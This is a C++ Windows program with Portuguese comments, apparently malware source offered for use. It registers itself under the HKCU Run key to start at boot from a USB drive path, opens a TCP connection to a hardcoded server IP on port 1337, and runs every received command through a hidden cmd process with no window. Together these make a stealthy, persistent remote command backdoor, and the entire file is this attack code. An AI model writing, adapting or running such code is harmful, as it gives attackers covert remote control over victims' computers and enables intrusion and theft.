#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "ws2_32.lib") // Link com a biblioteca ws2_32.lib

// Função para criar um processo invisível
void executeCodeInvisible(const std::string& command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Inicializar as estruturas
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Configurar para não mostrar a janela

    ZeroMemory(&pi, sizeof(pi));

    // Comando para ser executado no terminal
    std::string fullCommand = "cmd /c " + command;

    // Criar o processo de forma invisível
    if (!CreateProcess(NULL, const_cast<char*>(fullCommand.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "Erro ao criar o processo." << std::endl;
        return;
    }

    // Esperar até que o processo termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fechar os handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Função para adicionar o programa ao Registro e iniciá-lo no boot
void addToStartup() {
    HKEY hKey;
    const char* czStartName = "StealthTerminalProgram";  // Nome do valor no Registro
    const char* czExePath = "E:\\SHELLKILLER\\Shellkiller.exe";  // Caminho completo do executável no pendrive

    // Abrir a chave de Registro
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        // Adicionar o caminho do executável ao Registro
        RegSetValueEx(hKey, czStartName, 0, REG_SZ, (BYTE*)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
        std::cout << "Programa configurado para iniciar no boot!" << std::endl;
    } else {
        std::cerr << "Erro ao acessar o Registro!" << std::endl;
    }
}

// Função para conectar ao servidor e processar comandos
void connectToServer() {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    const char* serverIp = "192.168.1.101"; // Substitua pelo IP do servidor
    const int serverPort = 1337; // Porta do servidor

    // Inicializa a biblioteca Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Falha na inicialização do Winsock." << std::endl;
        return;
    }

    // Cria um socket
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Falha ao criar o socket." << std::endl;
        WSACleanup();
        return;
    }

    // Define o endereço do servidor
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);
    serverAddr.sin_port = htons(serverPort);

    // Conecta ao servidor
    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Falha ao conectar ao servidor." << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    std::cout << "Conectado ao servidor." << std::endl;

    while (true) {
        char buffer[1024];
        int bytesReceived = recv(ConnectSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0'; // Adiciona o terminador de string
            std::string command(buffer);

            if (command == "exit") {
                break;
            }

            // Executa o comando recebido de forma invisível
            executeCodeInvisible(command);
        }
    }

    // Fecha o socket e limpa a biblioteca Winsock
    closesocket(ConnectSocket);
    WSACleanup();
}

int main() {
    addToStartup();  // Adicionar o programa ao Registro para iniciar no boot

    // Conectar ao servidor e processar comandos
    connectToServer();

    return 0;
}